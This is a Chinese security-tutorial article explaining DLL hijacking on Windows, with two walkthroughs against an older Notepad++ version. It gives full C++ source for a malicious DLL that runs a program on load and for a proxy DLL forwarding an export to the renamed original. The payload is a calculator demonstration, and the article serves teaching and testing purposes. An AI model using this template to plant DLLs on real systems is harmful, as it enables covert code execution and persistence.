> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Dus6Ml7GXZ8AWIF7E90VQg)

**什么是 dll**

DLL（Dynamic Link Library），全称动态链接库，是 Windows 系统上程序正常运⾏必不可少的功 能模块，是实现代码重⽤的具体形式。简单的说，可以把 DLL 理解成帮助程序完成各种功能的组件。DLL 劫持漏洞（DLL Hijacking Exploit），严格点说，它是通过⼀些⼿段来劫持或者替换正常的 DLL，欺 骗正常程序加载预先准备好的恶意 DLL 的⼀类漏洞的统称。利⽤ DLL 劫持漏洞，病毒⽊⻢可以随着⽂档的 打开（或者其他⼀些程序正常⾏为）⽽激活⾃身，进⽽获得系统的控制权。

**原理**

DLL 劫持漏洞之所以被称为漏洞，还要从负责加载 DLL 的系统 API LoadLibrary 来看。熟悉 Windows 代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤ DLL 的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定 DLL 的完整路径。根据 MSDN ⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类 DLL LoadLibraryEx，ShellExecuteEx 等）时，系统会依次从以下 6 个位置去查找所需要的 DLL ⽂件（会根据 SafeDllSearchMode 配置⽽稍有不同）。

1.  程序所在⽬录。
    
2.  加载 DLL 时所在的当前⽬录。
    
3.  系统⽬录即 SYSTEM32 ⽬录。
    
4.  16 位系统⽬录即 SYSTEM ⽬录。
    
5.  Windows ⽬录。
    
6.  PATH 环境变量中列出的⽬录
    

dll 劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的 DLL 放在优先于正 常 DLL 所在的⽬录，就能够欺骗系统优先加载恶意 DLL，来实现 “劫持”。

**通过 VS2019 生成一个 dll**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxY05ib7aaPp0zxCIHqTuSdn64ib4lq1vhWGM2q0F6nQKutPITTqWmksmA/640?wx_fmt=png)

 ![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxB90frmqXDuT1Agv7v3fFUDgPbDcGLiaFUYiaNR1O5Oia3viahkd66UEDXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxFqyxLkZuAtDmfBOibSSLanYib8GiaU8FODbGjdIywmGXiagu1ytbv7gG7w/640?wx_fmt=png)

**两种不同的劫持方式**

使用工具: ProcessMonitor  

下载地址:https://docs.microsoft.com/en-us/sysinternals/downloads/procmon

**一. 劫持源程序没有的 dll**

使用 ProcessMonitor 找到一个没有加载的 dll, 这里使用 notepad++ 测试

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxMekJmOUtatqFK8AFCLyIkLIke4Qjic9VVNP8iaictBREDiaSRMLKhFJLvw/640?wx_fmt=png)

 **添加过滤条件进程名为 notepad++**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdx34O2WOuc2icGPdRBd3xGAdkIKJlt0zicRmKbUEuQyJLP86ywnLl2hUsA/640?wx_fmt=png)

 **添加过滤条件路径为 E:\notepad++**

 ![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxWK1f3pffWTPKo6K8j17mMfH3ZWGcfRE2VAEJnzKDIs1U4dnGMoSd7Q/640?wx_fmt=png)

 **添加结果为 NAME NOT FOUND**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxmpLr8Jicdyp6ZSicAqBKAIMAOQB8P9nYp2PPHVeFMBQtf52UkxgTyjRA/640?wx_fmt=png)

然后点击 ok

打开 notepad++

可以看到有很多 dll

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxRzQ0kP8p5XsKFicxBQJ3VmJUgVvEdTfOcCKmDofgJE6cRxdcU18WFPA/640?wx_fmt=png)

先双击 uxtheme.dll(**这里找一下, 找一个有 loadlibrary 相关的 API 的 dll，你的 notepad++ 可能没有这个 dll, 因为 notepad++ 版本有可能你的跟我的不一样**)，然后左键 stack

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxBOa1XASCS4Gmrz7cOib4PJvY4xujiabvXf4euBo1xCURX2RGP7lrPzvg/640?wx_fmt=png)

 找到 loadlibrary 相关的 API

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdx8kHt1qVQ2x7otXE6rYp1XyXXJwGOOhABnXy9NLibC8V36xjP1bV5mSQ/640?wx_fmt=png)

 在 vs 中编写恶意 dll 源⽂件后编译, 把编译好的恶意 dll ⽂件名修改为需要劫持的 dll ⽂件名 后放⼊到 notepad++.exe 下的同级⽬录下（放在其他地方也可以, 只要在 dll 寻找目录中）：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"


BOOL APIENTRY DllMain( HMODULE hModule,
DWORD  ul_reason_for_call,
LPVOID lpReserved
)
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
WinExec("calc.exe", SW_HIDE);
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```

 当进程创建时就打开计算器

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxajUWQw0IibVSXGkO0Mlb3ib4iaAZL0zia9PiaExVoycb1NrJiaicdhbljSoXw/640?wx_fmt=png)

 我们双击启动 notepad++ 一下试试

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdx6Qnh769XvShFDPVg0fcmiawbl67ZuN2KAqAQU7PNgEMezDkzHnXMD8Q/640?wx_fmt=png)

 成功弹出计算器, 执行了我们的恶意代码

**二. 劫持已经存在的 dll**

工具：CFF explorer  

下载地址:http://www.ntcore.com/files/ExplorerSuite.exe

1. 设置过滤条件如图, 过程跟刚刚差不多

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdx5htlGoDvzvPn4EP2rDGxjsNic8dILkJfN30TjPDHfHJfKStD0KzyMQQ/640?wx_fmt=png)

 2. 打开 notepad.exe，查看监听器中有 dll ⽂件的事件详情：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxAMxLBYN7Q7AibjpAjXHeBADsygrd4wk9bZ5k2HJeHArXuicV87KRePoA/640?wx_fmt=png)

 3. 可以看到这个 dll ⽂件是 notepad++ 使⽤系统 API LoadLibrary 调⽤的，所以可以利⽤该点对程序进⾏ dll 劫持

找到这个 dll, 就在 notepad++ 相同目录下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxb5PJcGDibSia7V22PZwAVmOe9DOG8RZUGk713EbicRbQ9N0xWfQNLVyhg/640?wx_fmt=png)

 4. 把这个 dll 拖入 CFF explorer 中

找到这个导出表

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxWHvS6iblUenKnVvwIUIr3JNVK8ydT2we82apiajHr9g8G5KAfm1icfCSQ/640?wx_fmt=png)

 他有一个导出函数

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxCicQGWRbglFMOdHjHxBVrveVB98emGfQUQXefD96AYbZ0OUEiaBQ1Ygw/640?wx_fmt=png)

5. 在 vs2019 中编写恶意 dll ⽂件后编译，将恶意 dll ⽂件名修改为所要劫持的 dll ⽂件名，将原 dll ⽂件名修改为恶意 dll ⽂件中所设置的⽂件名

```
#include "pch.h"
extern "C" __declspec(dllexport) void Scintilla_DirectFunction();
BOOL APIENTRY DllMain( HMODULE hModule,
DWORD  ul_reason_for_call,
LPVOID lpReserved
)
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
WinExec("calc.exe", SW_HIDE);
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
void Scintilla_DirectFunction()
{
MessageBox(NULL, L"hello", L"SD", NULL);
HINSTANCE hDll = LoadLibrary(L"SciLexer_org.dll");
if (hDll)
{
typedef DWORD(WINAPI* EXPFUNC)();
EXPFUNC expFunc = NULL;
expFunc = (EXPFUNC)GetProcAddress(hDll,"Scintilla_DirectFunction");
if (expFunc)
{
expFunc();
}
FreeLibrary(hDll);
}
return;
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxroHNSYJaicrW0kUpmBmkgWSZDgtnsyfzjW7AcKbapiapjy6YIGR60WbQ/640?wx_fmt=png)

 这里虽然报错但是还是弹出了计算机

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9nnicYOnUw9Fs8teibtftwdxSjDZNeDMSxMQ361sxJSoBsYfc1Bc1dImsfnBTxk3QGJdqBUEdk7w2w/640?wx_fmt=png)

**说明**

在 notepad++7.3.3 以后 notepad 官方已经修复这个漏洞, 再 7.3.3 版本以后每次运行 notepad++ 会先检查这个 dll 是否时原来的 dll, 这里如果要测试需要下载 7.3.3 以前的版本

本文仅供学习，切勿用于非法破坏！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

[**干货 | 如何快速完成 DLL 劫持，实现权限维持，重启上线**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247493305&idx=1&sn=5b292ca23204c7c6adabaff3bc6d7edf&chksm=ec1cb386db6b3a90e08b077116175120e078e74697832f9455eb2dc7020334955b8642af8288&scene=21#wechat_redirect)  

[**科普 | DLL 劫持原理与实践**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247487178&idx=1&sn=41916ea90c1503452ab68dcf435df470&chksm=ec1f5bf5db68d2e3ee81d150ac24fdf1145d33c700e1c49f1619e64050d8b104dc736b8d0c0d&scene=21#wechat_redirect)

本月报名可以参加抽奖送暗夜精灵 6Pro 笔记本电脑的优惠活动

[![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibHHibNbEpsAMia19jkGuuz9tTIfiauo7fjdWicOTGhPibiat3Kt90m1icJc9VoX8KbdFsB6plzmBCTjGDibQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496352&idx=1&sn=df6ddbf35ac56259299ce37681d56e5b&chksm=ec1ca79fdb6b2e8946f91d54722a7abb04f83111f9d348090167b804bc63b40d3efeb9beabbe&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：Buffer

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)